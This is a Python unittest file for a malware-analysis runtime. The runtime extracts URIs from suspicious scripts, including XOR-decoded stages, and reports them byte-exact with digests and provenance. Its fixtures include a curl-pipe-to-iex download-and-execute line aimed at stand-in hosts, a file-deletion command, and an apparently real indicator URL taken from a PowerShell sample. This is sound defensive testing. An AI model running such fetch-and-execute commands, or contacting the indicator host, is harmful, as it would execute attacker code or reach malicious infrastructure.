"""Exact indicators, read by the runtime instead of retyped by the model.

A hostname differing by one character is not a weaker finding -- it is a
different finding, and it sends an analyst somewhere else. Everything here is
about that: what gets rendered, what deliberately does not, and that the
values are byte-exact against the artifact.

Synthetic fixtures except where a test is explicitly the real-sample oracle.
"""

from __future__ import annotations

import hashlib
import tempfile
import unittest
from pathlib import Path

from orbit.runtime.analysis_indicators import (
    Indicator,
    MAX_INDICATORS,
    extract_indicators,
    render_indicators,
    uris_in,
)
from orbit.runtime.analysis_runtime import AnalysisRuntime, acquire_analysis_source
from orbit.runtime.evidence import EvidenceStore

HEADING = "## Verified indicators"


class UriExtractionTests(unittest.TestCase):
    def test_an_http_uri_is_found_with_its_parts(self) -> None:
        found = uris_in('curl -useb "http://example.invalid/1.php?s=abc" | iex')
        self.assertEqual(found, ["http://example.invalid/1.php?s=abc"])

    def test_https_and_other_schemes_are_found(self) -> None:
        text = "a https://a.invalid/x b ftp://b.invalid/y"
        self.assertEqual(
            uris_in(text), ["https://a.invalid/x", "ftp://b.invalid/y"]
        )

    def test_quotes_pipes_and_brackets_terminate_a_uri(self) -> None:
        """A script ends an address at punctuation far more often than not."""
        for wrapper, expected in (
            ('"http://a.invalid/p"', "http://a.invalid/p"),
            ("'http://a.invalid/p'", "http://a.invalid/p"),
            ("(http://a.invalid/p)", "http://a.invalid/p"),
            ("http://a.invalid/p|iex", "http://a.invalid/p"),
            ("see http://a.invalid/p.", "http://a.invalid/p"),
        ):
            with self.subTest(wrapper=wrapper):
                self.assertEqual(uris_in(wrapper), [expected])

    def test_legal_uri_characters_are_never_treated_as_terminators(self) -> None:
        """A comma separates query values and a semicolon introduces a path
        parameter. Cutting a URI at either yields a shorter address that looks
        entirely plausible -- and the digest rendered beside it would then
        attest the truncation instead of the artifact, which is worse than a
        model mistyping it.
        """
        for text, expected in (
            ("http://h.invalid/get.php?id=1,2,3", "http://h.invalid/get.php?id=1,2,3"),
            ("http://h.invalid/p?id=1,2&k=v", "http://h.invalid/p?id=1,2&k=v"),
            ("http://h.invalid/a;jsessionid=9", "http://h.invalid/a;jsessionid=9"),
            ('curl "http://h.invalid/p?a=1,2" | iex', "http://h.invalid/p?a=1,2"),
            # At end of input, where a trailing-character strip would bite.
            ("http://h.invalid/p?a=1,2", "http://h.invalid/p?a=1,2"),
            ("http://h.invalid/a;b", "http://h.invalid/a;b"),
            ("http://h.invalid/p?a=1:2", "http://h.invalid/p?a=1:2"),
        ):
            with self.subTest(text=text):
                self.assertEqual(uris_in(text), [expected])

    def test_trailing_punctuation_is_prose_not_address(self) -> None:
        """Position decides. A comma inside a URI is a query separator and is
        kept; the same character in final position is almost always the
        sentence, not the address."""
        for text, expected in (
            ("go to http://h.invalid/p, then stop", "http://h.invalid/p"),
            ("http://h.invalid/p;", "http://h.invalid/p"),
            ("see http://h.invalid/p.", "http://h.invalid/p"),
            ("(http://h.invalid/p)", "http://h.invalid/p"),
        ):
            with self.subTest(text=text):
                self.assertEqual(uris_in(text), [expected])

    def test_a_repeated_uri_is_reported_once(self) -> None:
        text = "http://a.invalid/x and again http://a.invalid/x"
        self.assertEqual(uris_in(text), ["http://a.invalid/x"])

    def test_text_without_a_uri_yields_nothing(self) -> None:
        self.assertEqual(uris_in("Remove-Item $env:APPDATA\\*.ps1 -Force"), [])

    def test_a_bare_hostname_is_not_a_uri(self) -> None:
        """No scheme, no indicator: guessing one would invent a fact."""
        self.assertEqual(uris_in("connect to example.invalid/path"), [])


class IndicatorProvenanceTests(unittest.TestCase):
    def test_each_indicator_carries_its_source_and_digest(self) -> None:
        text = 'line one\ncurl "http://a.invalid/1.php?s=k"\n'
        indicator = extract_indicators([("artifact", "ev_1", text)])[0]

        self.assertEqual(indicator.value, "http://a.invalid/1.php?s=k")
        self.assertEqual(indicator.authority, "a.invalid")
        self.assertEqual(indicator.path, "/1.php")
        self.assertEqual(indicator.query, "?s=k")
        self.assertEqual(indicator.evidence_id, "ev_1")
        self.assertEqual(indicator.source, "artifact")
        self.assertEqual(indicator.line, 2)
        self.assertEqual(
            indicator.sha256, hashlib.sha256(indicator.value.encode()).hexdigest()
        )

    def test_the_first_source_carrying_a_value_keeps_it(self) -> None:
        """The same address twice is one indicator, not two."""
        indicators = extract_indicators(
            [
                ("artifact", "ev_1", "http://a.invalid/x"),
                ("jscript_numeric_xor", "ev_2", "http://a.invalid/x"),
            ]
        )
        self.assertEqual(len(indicators), 1)
        self.assertEqual(indicators[0].source, "artifact")

    def test_a_decoded_stage_can_be_the_source(self) -> None:
        indicators = extract_indicators(
            [("artifact", "ev_1", "no address here"),
             ("powershell_numeric_xor", "ev_2", "http://b.invalid/y")]
        )
        self.assertEqual(indicators[0].source, "powershell_numeric_xor")
        self.assertEqual(indicators[0].evidence_id, "ev_2")

    def test_the_indicator_count_is_bounded(self) -> None:
        """The bound is pinned by value, not by reference to itself: asserting
        the result equals the constant passes for any constant, including one
        large enough to turn a report into a transcript."""
        self.assertEqual(MAX_INDICATORS, 32)
        text = "\n".join(f"http://h{i}.invalid/p" for i in range(MAX_INDICATORS * 3))
        self.assertEqual(len(extract_indicators([("artifact", "ev", text)])), 32)


class RenderingTests(unittest.TestCase):
    def _render(self, text: str) -> str:
        return render_indicators(extract_indicators([("artifact", "ev_1", text)]))

    def test_nothing_is_rendered_when_nothing_is_exact(self) -> None:
        self.assertEqual(self._render("no address in here"), "")
        self.assertEqual(render_indicators([]), "")

    def test_the_value_is_rendered_verbatim(self) -> None:
        rendered = self._render('curl "http://a.invalid/1.php?s=k"')
        self.assertIn("http://a.invalid/1.php?s=k", rendered)
        self.assertIn(HEADING, rendered)
        self.assertIn("authority: a.invalid", rendered)
        self.assertIn("path: /1.php", rendered)
        self.assertIn("query: ?s=k", rendered)
        self.assertIn("evidence: ev_1", rendered)

    def test_nothing_is_labelled(self) -> None:
        """What an address is for is the analysis's conclusion, not this."""
        rendered = self._render("http://a.invalid/x").lower()
        for word in ("c2", "command and control", "malicious", "beacon",
                     "payload", "attacker", "threat"):
            with self.subTest(word=word):
                self.assertNotIn(word, rendered)

    def test_the_digest_reaches_the_rendered_section(self) -> None:
        """It is the field an analyst would use to confirm the value."""
        import hashlib

        value = "http://a.invalid/1.php?s=k"
        rendered = self._render(f'curl "{value}"')
        self.assertIn(hashlib.sha256(value.encode()).hexdigest(), rendered)

    def test_an_artifact_reading_is_not_offered_as_an_evidence_id(self) -> None:
        """The report instruction says to cite `evidence:<id>`; a digest in
        that slot invites a citation that would never resolve."""
        indicators = extract_indicators([("artifact", "sha256:abc", "http://a.invalid/x")])
        text = render_indicators(indicators)
        self.assertIn("artifact: sha256:abc", text)
        self.assertNotIn("evidence: sha256:", text)

    def test_a_store_backed_indicator_keeps_the_evidence_label(self) -> None:
        text = render_indicators(
            extract_indicators([("powershell_numeric_xor", "ev_9", "http://a.invalid/x")])
        )
        self.assertIn("evidence: ev_9", text)

    def test_a_trailing_slash_is_part_of_the_address(self) -> None:
        self.assertEqual(uris_in("http://a.invalid/"), ["http://a.invalid/"])

    def test_a_uri_without_a_path_renders_without_empty_fields(self) -> None:
        rendered = self._render("http://a.invalid")
        self.assertIn("authority: a.invalid", rendered)
        self.assertNotIn("path:", rendered)
        self.assertNotIn("query:", rendered)


class RuntimeIntegrationTests(unittest.TestCase):
    def _runtime(self, text: str) -> AnalysisRuntime:
        tmpdir = tempfile.TemporaryDirectory(prefix="orbit-ioc-")
        self.addCleanup(tmpdir.cleanup)
        tmp = Path(tmpdir.name)
        artifact = tmp / "artifact.ps1"
        artifact.write_text(text, encoding="utf-8")
        runtime = AnalysisRuntime(
            backend=None,
            source=acquire_analysis_source(artifact, tmp / "owned"),
            evidence_store=EvidenceStore(root=tmp / "evidence"),
        )
        self.addCleanup(runtime.close)
        return runtime

    def test_a_plain_literal_uri_is_recovered_from_the_artifact(self) -> None:
        runtime = self._runtime('curl -useb "http://a.invalid/1.php?s=k" | iex\n')
        rendered = runtime.verified_indicators()

        self.assertIn("http://a.invalid/1.php?s=k", rendered)
        # Provenance is the session's pinned snapshot, named by its digest.
        self.assertIn(f"sha256:{runtime.source.sha256}", rendered)

    def test_an_artifact_without_a_uri_renders_nothing(self) -> None:
        runtime = self._runtime("Remove-Item $env:APPDATA\\*.ps1 -Force\n")
        self.assertEqual(runtime.verified_indicators(), "")
        self.assertEqual(runtime.deterministic_sections(), "")

    def test_indicators_precede_the_transformation_appendix(self) -> None:
        """Shortest and most often acted on first; the work that produced it
        after."""
        decoder = (
            "function dec(s, k, d) {\n"
            "    var out = '';\n"
            "    var parts = s.split(d);\n"
            "    for (var i = 0; i < parts.length; i++) {\n"
            "        out += String.fromCharCode(parts[i] ^ k);\n"
            "    }\n"
            "    return out;\n"
            "}\n"
        )
        uri = "http://a.invalid/decoded"
        encoded = ",".join(str(ord(c) ^ 7) for c in uri)
        runtime = self._runtime(decoder + f'dec("{encoded}", 7, ",");\n')

        sections = runtime.deterministic_sections()
        self.assertIn(HEADING, sections)
        self.assertIn("## Deterministic transformations", sections)
        self.assertLess(
            sections.index(HEADING),
            sections.index("## Deterministic transformations"),
        )
        self.assertIn(uri, sections)

    def test_rendering_mutates_nothing(self) -> None:
        runtime = self._runtime('curl "http://a.invalid/x"\n')
        before = set(runtime.evidence_store.records)
        runtime.verified_indicators()
        runtime.deterministic_sections()
        self.assertEqual(set(runtime.evidence_store.records), before)


class ArtifactEncodingTests(unittest.TestCase):
    """Which readings of an artifact may produce a "verified" value."""

    def _views(self, raw: bytes):
        from orbit.runtime.analysis_runtime import _decoded_views

        return _decoded_views(raw)

    def test_utf8_text_is_read(self) -> None:
        views = self._views(b"curl http://a.invalid/p")
        self.assertEqual([label for label, _ in views], ["artifact"])

    def test_undecodable_bytes_produce_nothing_rather_than_mojibake(self) -> None:
        """`errors="replace"` would put U+FFFD into a string this calls
        verified, and the digest beside it would attest the corruption."""
        raw = "caf\u00e9 http://a.invalid/p".encode("latin-1")
        self.assertEqual(self._views(raw), [])
        for _label, text in self._views(raw):
            self.assertNotIn("\ufffd", text)

    def test_utf16_text_is_read_in_both_byte_orders(self) -> None:
        """An address in a UTF-16 artifact is exact too; missing it silently
        is worse than saying nothing, because the section simply disappears."""
        for encoding, expected in (("utf-16-le", "artifact utf-16le"),
                                   ("utf-16-be", "artifact utf-16be")):
            with self.subTest(encoding=encoding):
                raw = "x http://evil.invalid/p".encode(encoding)
                views = self._views(raw)
                self.assertEqual([label for label, _ in views], [expected])
                self.assertIn("http://evil.invalid/p", views[0][1])

    def test_binary_bytes_produce_nothing(self) -> None:
        self.assertEqual(self._views(bytes(range(256))), [])

    def test_empty_bytes_produce_nothing(self) -> None:
        self.assertEqual(self._views(b""), [])

    def test_the_reading_is_named_in_the_provenance(self) -> None:
        raw = "x http://evil.invalid/p".encode("utf-16-le")
        indicators = extract_indicators(
            [(label, "sha256:abc", text) for label, text in self._views(raw)]
        )
        self.assertEqual(indicators[0].source, "artifact utf-16le")


class ReportContractTests(unittest.TestCase):
    """The narrow discipline added to the reporting instruction."""

    def _instruction(self) -> str:
        from orbit.runtime.analysis_runtime import ANALYSIS_REPORT_INSTRUCTION

        return ANALYSIS_REPORT_INSTRUCTION.lower()

    def test_beaconing_requires_repeated_or_callback_contact(self) -> None:
        """The condition, not merely the word: a contract that mentions
        beaconing without saying what earns it licenses the overclaim it is
        supposed to prevent."""
        text = self._instruction()
        self.assertIn("name a behaviour only when the evidence shows it", text)
        self.assertIn("repeated or call-back contact", text)
        self.assertIn("before calling something beaconing", text)

    def test_persistence_requires_recurrent_execution(self) -> None:
        text = self._instruction()
        self.assertIn("persistence", text)
        self.assertIn("future or recurrent execution", text)

    def test_staging_is_distinguished_from_persistence(self) -> None:
        self.assertIn("staging until something makes it run again", self._instruction())

    def test_timing_and_deletion_are_described_factually(self) -> None:
        text = self._instruction()
        self.assertIn("describe timing and file deletion as what they do", text)
        self.assertIn("only where a purpose is evidenced", text)

    def test_the_next_step_must_be_locally_actionable(self) -> None:
        text = self._instruction()
        self.assertIn("offline and isolated", text)
        self.assertIn("retrieving a remote resource is not that step", text)

    def test_the_contract_names_no_artifact_or_technique(self) -> None:
        """General discipline, not knowledge of any sample."""
        text = self._instruction()
        for term in ("powershell", "curl", "gibuzuy", "smartmaket",
                     "xor", "base64", ".ps1", "mints13"):
            with self.subTest(term=term):
                self.assertNotIn(term, text)


class GenericityTests(unittest.TestCase):
    """No knowledge of any particular artifact may live in production."""

    SAMPLE_TERMS = (
        "gibuzuy", "gibuyuy", "mints13", "peXF7I6W", "smartmaket", "AA1789FF",
    )

    def test_production_contains_no_sample_indicator(self) -> None:
        root = Path(__file__).resolve().parents[1] / "src" / "orbit"
        for path in root.rglob("*.py"):
            text = path.read_text(encoding="utf-8", errors="replace")
            for term in self.SAMPLE_TERMS:
                with self.subTest(path=path.name, term=term):
                    self.assertNotIn(term, text)

    def test_extraction_has_no_network_or_execution_primitive(self) -> None:
        import orbit.runtime.analysis_indicators as module

        text = Path(module.__file__).read_text(encoding="utf-8")
        for token in ("urllib", "requests", "socket", "http.client",
                      "eval(", "exec(", "subprocess", "__import__"):
            with self.subTest(token=token):
                self.assertNotIn(token, text)


class RealSampleOracleTests(unittest.TestCase):
    """The pinned PowerShell artifact, with no model involved."""

    SAMPLE = Path(__file__).resolve().parents[1] / "workdir" / "samples" / "peXF7I6W.ps1"
    SAMPLE_SHA = "5eba3e4538cffbde5d39ba81eb4ed85e9c9cc6065e036503073a43a9478f405d"
    # Byte-exact, derived from the artifact; asserted here so a transcription
    # error anywhere in the rendering path fails loudly.
    URI = "http://gibuzuy37v2v.top/1.php?s=mints13"
    HOST = "gibuzuy37v2v.top"

    def _text(self) -> str:
        if not self.SAMPLE.exists():
            self.skipTest("pinned sample not present")
        data = self.SAMPLE.read_bytes()
        if hashlib.sha256(data).hexdigest() != self.SAMPLE_SHA:
            self.skipTest("sample is not the pinned artifact")
        return data.decode("utf-8", "replace")

    def test_the_exact_uri_is_recovered(self) -> None:
        self.assertEqual(uris_in(self._text()), [self.URI])

    def test_the_hostname_is_byte_exact(self) -> None:
        """The near-miss that motivated this: one character at index 4."""
        indicator = extract_indicators([("artifact", "ev", self._text())])[0]
        self.assertEqual(indicator.authority, self.HOST)
        self.assertNotEqual(indicator.authority, "gibuyuy37v2v.top")
        self.assertEqual(indicator.authority[4], "z")

    def test_an_ipv6_authority_is_kept_whole(self) -> None:
        """The colons inside a bracketed literal are part of the address."""
        indicator = extract_indicators(
            [("artifact", "ev", "curl http://[2001:db8::1]:8080/p")]
        )[0]
        self.assertEqual(indicator.value, "http://[2001:db8::1]:8080/p")
        self.assertEqual(indicator.authority, "[2001:db8::1]:8080")

    def test_userinfo_and_port_stay_in_the_authority(self) -> None:
        """Dropping them would report a different address than the artifact."""
        indicator = extract_indicators(
            [("artifact", "ev", "http://user:pw@a.invalid:8443/p")]
        )[0]
        self.assertEqual(indicator.authority, "user:pw@a.invalid:8443")

    def test_the_rendered_section_carries_every_part(self) -> None:
        rendered = render_indicators(
            extract_indicators([("artifact", "ev_1", self._text())])
        )
        self.assertIn(self.URI, rendered)
        self.assertIn(f"authority: {self.HOST}", rendered)
        self.assertIn("path: /1.php", rendered)
        self.assertIn("query: ?s=mints13", rendered)

    def test_the_artifact_contains_no_other_absolute_uri(self) -> None:
        """One address, so a report naming a second would be inventing it."""
        self.assertEqual(len(uris_in(self._text())), 1)


if __name__ == "__main__":
    unittest.main()
